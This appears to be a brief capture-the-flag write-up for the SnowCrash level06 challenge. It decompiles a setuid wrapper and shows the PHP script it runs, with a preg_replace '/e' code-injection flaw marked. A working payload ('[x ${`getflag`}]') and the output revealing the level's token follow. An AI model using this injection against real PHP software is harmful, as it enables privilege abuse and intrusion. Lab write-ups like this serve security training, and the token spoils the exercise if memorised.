Decompiling level06 program at ~/


int32_t main(int32_t argc, char** argv, char** envp)
	int32_t esi = strdup(0x80487d4)
	int32_t ebx = strdup(0x80487d4)
	if (*(argv + 4) != 0)
	    free(esi)
	    strdup(*(argv + 4))
	    if (*(argv + 8) != 0)
	        free(ebx)
	        strdup(*(argv + 8))
	int32_t eax_6 = getegid()
	int32_t eax_7 = geteuid()
	setresgid(eax_6)
	setresuid(eax_7, eax_7, eax_7)
	int32_t var_34 = 0x80487d5  {"/usr/bin/php"}
	execve(0x80487d5, &var_34, envp)  {"/usr/bin/php"}
return 0

It looks like it just calls php with a file as its argument.
There is a php file next to the program:

```
#!/usr/bin/php
<?php
	function y($m)
	{
		$m = preg_replace("/\./", " x ", $m);
		$m = preg_replace("/@/", " y", $m);
		return $m;
	}

	function x($y, $z)
	{
		$a = file_get_contents($y);
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); <<<<--- the vulnerable line matches "[x anything]"
		$a = preg_replace("/\[/", "(", $a);
		$a = preg_replace("/\]/", ")", $a); return $a;
	}

	$r = x($argv[1], $argv[2]);
	print $r;
?>
```

```
echo '[x ${`getflag`}]' > /tmp/x
./level06 /tmp/x
```

level06@SnowCrash:~$ ./level06 /dev/shm/x
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

 :D :D :D 
